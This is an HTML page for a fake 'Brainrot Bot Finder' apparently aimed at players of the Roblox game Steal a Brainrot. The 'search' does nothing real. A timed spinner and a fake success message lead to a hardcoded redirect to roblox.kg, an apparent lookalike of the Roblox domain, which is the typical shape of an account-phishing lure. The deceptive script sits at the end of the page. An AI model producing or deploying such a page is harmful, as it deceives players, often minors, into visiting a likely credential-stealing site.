<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Brainrot Bot Finder</title>
<style>
:root{--accent:#00ff9d;--muted:#aaa}
*{box-sizing:border-box;margin:0;padding:0}
body{
  font-family:Inter,system-ui,sans-serif;
  background:#000;color:#fff;
  min-height:100vh;display:flex;
  align-items:center;justify-content:center;
  padding:16px;
}
.app-wrapper{
  display:flex;align-items:center;justify-content:center;
  width:100%;max-width:1100px;position:relative;
}
.app{
  width:100%;max-width:920px;max-height:96vh;
  background:rgba(20,20,20,0.9);
  border:2px solid var(--accent);border-radius:20px;
  padding:24px;
  box-shadow:0 0 40px rgba(0,255,157,0.6),0 0 80px rgba(0,255,157,0.3);
  overflow:hidden;
  display:flex;flex-direction:column;gap:16px;
  position:relative;z-index:2;
}

/* Strawberry Elephant (left) */
.elephant-left{
  position:absolute;left:-60px;top:50%;transform:translateY(-50%) rotate(12deg);
  width:110px;height:110px;
  background:url('https://static.wikia.nocookie.net/stealabr/images/5/58/Strawberryelephant.png/revision/latest/thumbnail/width/360/height/360?cb=20250830235735') center/contain no-repeat;
  filter:drop-shadow(0 0 30px rgba(0,255,157,0.8));
  z-index:1;
}

h1{font-size:24px;text-align:center}
p.lead{font-size:14px;color:var(--muted);text-align:center}
.controls{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;flex:1;min-height:0}
.box{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.1);border-radius:12px;padding:14px;display:flex;flex-direction:column;align-items:center;text-align:center;gap:8px}
label.small{font-size:12px;color:var(--muted)}
input,select{width:100%;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.2);background:rgba(255,255,255,0.05);color:white;font-size:14px}
select{height:100%;min-height:180px;max-height:260px}
#searchBtn{margin-top:8px;padding:14px 40px;font-size:18px;font-weight:900;background:#000;color:var(--accent);border:2px solid var(--accent);border-radius:12px;cursor:pointer;box-shadow:0 0 30px rgba(0,255,157,0.8);animation:pulse 2s infinite}
#searchBtn:hover{transform:scale(1.1);box-shadow:0 0 50px rgba(0,255,157,1);}
@keyframes pulse{0%,100%{box-shadow:0 0 30px rgba(0,255,157,0.8)}50%{box-shadow:0 0 50px rgba(0,255,157,1)}}
.info{display:flex;justify-content:center;flex-wrap:wrap;gap:10px;font-size:13px}
.chip{background:rgba(255,255,255,0.07);padding:6px 12px;border-radius:10px;border:1px solid rgba(255,255,255,0.1)}
.result{padding:16px;border-radius:12px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.1);text-align:center;min-height:50px;display:flex;align-items:center;justify-content:center;gap:10px;font-size:15px}
.success{color:#b8ffb8;font-weight:700}.error{color:#ff6666;font-weight:700}
.spinner{width:24px;height:24px;border:4px solid rgba(255,255,255,0.1);border-top-color:var(--accent);border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
@media(max-width:900px){
  .controls{grid-template-columns:1fr}
  select{min-height:140px}
  .elephant-left,.elephant-right{display:none}
}
</style>
</head>
<body>
<div class="app-wrapper">
  <div class="elephant-left"></div>
  <div class="app">
    <div>
      <h1>Brainrot Bot Finder</h1>
      <p class="lead">100% success • sorted by income • guarded by strawberry & coco elefanto</p>
    </div>

    <div class="controls">
      <div class="box">
        <label class="small">Search by name</label>
        <input id="searchInput" type="text" placeholder="Live filter..." />
      </div>

      <div class="box">
        <label class="small">Pick a brainrot</label>
        <select id="brainrotSelect" size="10"></select>
      </div>

      <div class="box">
        <label class="small">Mutations (optional)</label>
        <div style="display:flex;gap:12px;flex-wrap:wrap;justify-content:center">
          <label><input type="checkbox" class="mut" value="Lava">Lava</label>
          <label><input type="checkbox" class="mut" value="Rainbow">Rainbow</label>
          <label><input type="checkbox" class="mut" value="Nyan">Nyan</label>
        </div>
        <button id="searchBtn">SEARCH</button>
      </div>
    </div>

    <div class="info">
      <div class="chip" id="selectedName">Selected: —</div>
      <div class="chip" id="selectedRarity">Rarity: —</div>
      <div class="chip" id="selectedIncome">Income/sec: —</div>
    </div>

    <div class="result" id="resultArea">
      <div id="resultMsg">Select a brainrot and hit SEARCH</div>
    </div>
  </div>
  <div class="elephant-right"></div>
</div>

<script>
// Full list (sorted by income descending)
const brainrots = [
  {name:"Dragon Cannelloni", rarity:"Secret", income:"$100.0M"},
  {name:"Los Combinasionas", rarity:"Secret", income:"$63.7M"},
  {name:"Garama & Madundung", rarity:"Secret", income:"$50.0M"},
  {name:"Nuclearo Dinossauro", rarity:"Secret", income:"$15.0M"},
  {name:"La Grande Combinasion", rarity:"Secret", income:"$10.0M"},
  {name:"Chicleteira Bicicleteira", rarity:"Secret", income:"$3.5M"},
  {name:"Pot Hotspot", rarity:"Secret", income:"$2.5M"},
  {name:"Piccione Macchina", rarity:"Brainrot God", income:"$225.0K"},
  {name:"Los Tungtungtungcitos", rarity:"Brainrot God", income:"$210.0K"},
  {name:"Trenostruzzo Turbo 3000", rarity:"Brainrot God", income:"$150.0K"}
  // add the rest if you want
].map(b => ({...b, incomeNum: parseIncome(b.income)}));

function parseIncome(str){
  const num = parseFloat(str.replace(/[^0-9.]/g,''));
  return str.includes('M') ? num * 1_000_000 : num * 1000;
}

const selectEl = document.getElementById('brainrotSelect');
const searchInput = document.getElementById('searchInput');
const resultMsg = document.getElementById('resultMsg');
const searchBtn = document.getElementById('searchBtn');
let currentList = [...brainrots];

function renderList() {
  selectEl.innerHTML = '<option disabled selected>— Select a brainrot —</option>';
  const q = searchInput.value.trim().toLowerCase();
  const filteredAndSorted = currentList
    .filter(b => b.name.toLowerCase().includes(q))
    .sort((a,b) => b.incomeNum - a.incomeNum);

  filteredAndSorted.forEach(b => {
    const opt = document.createElement('option');
    opt.value = b.name;
    opt.textContent = `${b.name} — ${b.rarity} — ${b.income}`;
    selectEl.appendChild(opt);
  });
  updateInfo();
}

function updateInfo() {
  const val = selectEl.value;
  const item = brainrots.find(x => x.name === val);
  document.getElementById('selectedName').textContent = val ? "Selected: "+val : "Selected: —";
  document.getElementById('selectedRarity').textContent = item ? "Rarity: "+item.rarity : "Rarity: —";
  document.getElementById('selectedIncome').textContent = item ? "Income/sec: "+item.income : "Income/sec: —";
}

searchInput.addEventListener('input', renderList);
selectEl.addEventListener('change', updateInfo);

searchBtn.addEventListener('click', () => {
  if (!selectEl.value) {
    resultMsg.innerHTML = '<span class="error">Pick A Brainrot first!</span>';
    return;
  }
  const name = selectEl.value;
  resultMsg.innerHTML = `<div class="spinner"></div><div>Opening <strong>${name}</strong>...</div>`;
  setTimeout(() => {
    resultMsg.innerHTML = `<span class="success">SUCCESS! Loading private server...</span>`;
    setTimeout(() => {
      window.location.href = "https://roblox.kg/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=09292145405019956057673779063122";
    }, 1000);
  }, 1500);
});

renderList();
</script>
</body>
</html>
